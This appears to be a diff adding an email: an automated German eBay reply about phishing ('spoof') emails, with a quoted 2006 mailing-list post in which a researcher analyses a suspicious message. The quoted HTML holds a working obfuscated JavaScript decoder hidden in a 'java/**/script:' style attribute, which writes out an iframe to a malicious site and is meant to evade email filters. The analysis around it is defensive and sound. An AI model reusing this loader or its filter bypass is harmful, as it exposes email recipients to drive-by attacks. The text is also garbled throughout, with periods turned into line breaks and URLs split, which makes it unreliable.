@@ -1,0 +1,247 @@
+Hallo,
+
+vielen Dank fuer Ihre E-Mail, in der Sie uns von einer verdaechtigen 
+E-Mail berichten, die vorgibt, von eBay, PayPal oder einer anderen 
+bekannten Website gesendet worden zu sein
+ Diese E-Mails werden auch 
+Spoof-E-Mails genannt
+ Absender solcher E-Mails hoffen, dass die 
+Empfaenger auf diese E-Mails antworten oder Links darin anklicken und 
+dann persoenliche Daten angeben
+ 
+
+Die E-Mail, die Sie an uns weitergeleitet haben, wurde nicht von eBay 
+oder PayPal versendet
+ 
+
+Wir fordern Sie dringend dazu auf, sehr vorsichtig zu sein, wenn Sie =
+per
+E-Mail nach persoenlichen Daten gefragt werden
+ Klicken Sie in solchen =
+
+Faellen keine Links in der verdaechtigen E-Mail an und fuellen Sie =
+keine
+darin enthaltenen vorgefertigten Formulare aus
+ 
+
+Wenn Sie sich nicht sicher sind, ob Sie bereits Daten (z
+B
+ =
+Passwoerter 
+fuer Ihr eBay-Mitgliedskonto, Ihr PayPal-Konto oder Ihr 
+Kreditkartenkonto) auf einer solchen Seite angegeben haben, empfehlen 
+wir Ihnen, umgehend Ihre Passwoerter zu aendern und Ihre 
+Kreditkartenabrechnung zu kontrollieren
+
+
+So koennen Sie Ihr Passwort fuer Ihr eBay-Mitgliedskonto aendern:
+
+1
+ Gehen Sie in "Mein eBay"
+ Sie finden den Link zu "Mein eBay" auf 
+nahezu jeder eBay-Seite in der oberen Navigationsleiste
+
+
+2
+ Unter "Persoenliche Daten" koennen Sie Ihr Passwort aendern
+
+
+3
+ Alternativ dazu finden Sie auch auf der Einlog-Seite einen Link zum =
+
+Passwort aendern, direkt neben dem Eingabefeld
+ Die Einlog-Seite ist 
+ebenfalls von der oberen Navigationsleiste von nahezu jeder eBay-Seite =
+
+aus erreichbar
+
+
+Sollten Sie in Zukunft E-Mails erhalten, in denen Sie zur Angabe von 
+persoenlichen Daten aufgefordert werden, senden Sie uns diese einzeln 
+unter der Verwendung der WEITERLEITUNGSFUNKTION Ihres E-Mail-Programms =
+
+an spoof@ebay
+de 
+
+
+Nur durch Nutzung dieser Funktion kann gewaehrleistet werden, dass 
+tatsaechlich der gesamte Inhalt der E-Mail weitergegeben wird
+ 
+
+Bitte verwenden Sie also nicht die "Antworten"-Funktion und bitte =
+senden
+Sie die verdaechtige E-Mail nicht als Datei-Anhang
+ Bitte veraendern =
+Sie
+auch nicht die Betreff-Zeile der E-Mail, die Sie erhalten haben
+
+
+Sie finden diese und andere wichtige Informationen zu Spoof-E-Mails 
+unter: 
+
+http://pages
+ebay
+de/education/spooftutorial/index
+html
+
+Antworten Sie bitte nicht auf diese E-Mail
+ Sie wurde automatisch 
+versendet, um Ihnen so schnell wie moeglich zu antworten
+
+
+Die E-Mail-Adresse spoof@ebay
+de ist ausschliesslich fuer die 
+Weiterleitung von Hinweisen auf moegliche betruegerische E-Mails 
+reserviert
+ Fuer Anfragen zu einem anderen Thema finden Sie viele 
+hilfreiche Informationen auch auf unseren Hilfeseiten:
+
+http://pages
+ebay
+de/help/index
+html 
+
+Wenn Sie mit uns in Kontakt treten moechten, nutzen Sie unser 
+Kontaktformular:
+
+http://pages
+ebay
+de/kontakt 
+
+Waehlen Sie dabei bitte unbedingt den fuer Ihr Anliegen passenden 
+Betreff, da Sie sonst laenger als noetig auf eine Antwort warten 
+muessten
+
+
+Weitere Informationen zum sicheren und vertrauensvollen Handeln bei =
+eBay
+finden Sie in unserem Sicherheitsportal:
+ 
+http://pages
+ebay
+de/sicherheitsportal/
+
+Fuer viele Themen bieten wir zusaetzlich Telefon-Support an:
+
+http://pages
+ebay
+de/telefon
+
+Wir moechten Ihnen ausdruecklich fuer Ihre Unterstuetzung in dieser =
+fuer
+alle eBay-Mitglieder sehr wichtigen Angelegenheit danken und wuenschen =
+
+Ihnen weiterhin viel Spass und Erfolg bei eBay
+
+
+Mit freundlichen Gruessen
+
+eBay-Team
+
+eBay - Der weltweite Online-Marktplatz
+
+
+**********************************************************
+
+Wichtiger Hinweis: eBay wird Sie unaufgefordert niemals nach 
+persoenlichen Angaben (wie z
+ B
+ Passwort, Kreditkarten- oder 
+Bank-Informationen) fragen
+
+
+**************************************************************
+
+Schuetzen Sie sich vor betruegerischen Internetseiten (sog
+ 
+Spoof-Seiten)
+ Die kostenlose eBay Toolbar mit dem "Sicherheits-Check" =
+
+warnt Sie, wenn Sie auf einer potentiell betruegerischen Internetseite =
+
+sind
+ Die eBay Toolbar finden Sie hier: 
+www
+ebay
+de/ebay_toolbar 
+ 
+
+Bitte beachten Sie, dass eBay niemals E-Mails sendet, die eine 
+ausfuehrbare Datei als Anhang haben oder einen Link beinhalten, der zu =
+
+einer Seite mit ausfuehrbaren oder herunterladbaren Dateien fuehrt
+
+
+**********************************************************
+
+
+
+Original Message Follows:
+-------------------------
+
+On Fri, 17 Feb 2006 gandalf@digital
+net wrote:
+
+> I just receieved this exploit, I have looked around and all I could 
+find
+> lately are the following Java issues: Gentoo Linux Security Advisory
+> GLSA 200601-10 - Sun and Blackdown Java: Applet privilege escalation
+
+> I don't have the Java knowledge to figure out what is going on, but =
+it
+> doesn't look good
+
+
+it's not a javascript exploit, it's obfuscated javascript
+ basially it
+decodes itself to display something along the lines of (tags =
+obscured):
+
+[iframe src=3Dhttp://badsite/some/dir/stuff] [/iframe]
+
+this can be used to bypass filters that look in your email for known
+undesirable sites
+
+
+nothing special about it, and no exploit
+
+
+> <a target=3D3D"_blank" =
+ 
+href=3D3D"www
+yahoo
+com>"style=3D3D"background:url\(java/**/script:function 
+dc(x){var =
+
+l=3D3Dx
+length,b=3D3D1024,i,j,r,p=3D3D0,s=3D3D0,w=3D3D0,t=3D3DArray(63,6,22,2,4,19,5=
+
+6,49,24,46,0,0,0,0,0,0,61,0,5,58,48,51,17,18,13,16,11,20,27,47,60,53,8,5=
+
+7,14,7,9,55,36,31,1,40,15,0,0,0,0,44,0,33,41,52,62,32,50,28,43,10,21,12,=
+
+26,42,59,38,39,34,29,23,45,3,37,25,30,35,54);for(j=3D3DMath
+ceil(l/b);j>0;=
+
+j--){r=3D3D'';for(i=3D3DMath
+min(l,b);i>0;i--,l--){w|=3D3D(t[x
+charCodeAt(p++)=
+
+-48])<<s;if(s){r+=3D3DString
+fromCharCode(165^w&255);w>>=3D3D8;s-=3D3D2}else{s=
+
+=3D3D6}}document
+write(r)}}dc('wfNDs5kfAsYOsLkoHSrcj0bqiRbvJGbvF96vK3Qqrzb
+q4h8aHukE3Ugc82waGEgDFUkoj9woifNDs5kfAMT'))">
+
+________
+jose nazario, ph
+d
+			nobody@example
+com
+http://example
+com/~jose/ 		http://infosecdaily
+net/
+					http://www
+wormblog
+com/
